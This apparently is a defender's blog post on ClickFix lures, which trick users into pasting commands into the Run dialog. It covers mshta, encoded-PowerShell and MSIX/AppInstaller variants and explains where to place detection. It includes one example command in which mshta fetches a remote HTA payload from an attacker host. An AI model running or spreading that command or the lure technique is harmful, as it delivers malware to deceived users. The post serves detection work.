ClickFix is a social engineering delivery technique that abuses the user's own clipboard and muscle memory. The victim is shown a fake CAPTCHA or error dialog instructing them to paste a command into Run or PowerShell. The command was already copied to their clipboard by the page.

This post maps coverage across the current delivery variants and identifies the chokepoints worth instrumenting.

## Variants in the wild

The three delivery shapes I'm tracking:

**1. mshta / HTA via clipboard paste**
The classic. Page sets `window.clipboardData` or uses the Clipboard API to write an `mshta` invocation. Victim pastes into Run dialog.

```
mshta https://attacker[.]com/payload.hta
```

Detection angle: `mshta.exe` with a network argument is high-signal. Process creation log, parent is `explorer.exe` or `cmd.exe` (not a browser subprocess).

**2. PowerShell via Run dialog**
Increasingly common. Clipboard contains an encoded or obfuscated PowerShell one-liner. Run dialog (`Win+R`) is used to execute.

Detection angle: `powershell.exe` child of `explorer.exe` with `-EncodedCommand` or `-Enc` and a Base64 blob. The parent chain is the tell — PowerShell should not spawn directly from the shell.

**3. MSIX lure + AppInstaller abuse**
Newer variant. The clipboard contains a `ms-appinstaller:` URI or the page auto-launches the MSIX protocol handler. Victim clicks through the Windows App Installer dialog.

Detection angle: `AppInstaller.exe` or `AppXDeploymentServer` events combined with a network origin. Microsoft has partially mitigated this but the protocol handler remains abusable in some configurations.

## Coverage gaps

The Run dialog (`explorer.exe` → child process) is consistently underinstrumented. Most orgs have good coverage on PowerShell spawned from Office or browsers, but miss the `explorer.exe` parent chain entirely.

If you can only instrument one thing: `powershell.exe` or `mshta.exe` with parent `explorer.exe` and a network argument or encoded payload. Low false positive rate, high catch probability for the current generation of ClickFix lures.

## Sigma coverage

Basic coverage exists in the community rules. The gap is the MSIX/AppInstaller variant and the clipboard-paste-to-Run workflow where no network event is generated by the initial launch. Post-execution coverage (the dropped stager calling home) is more reliable than trying to catch the paste event itself.
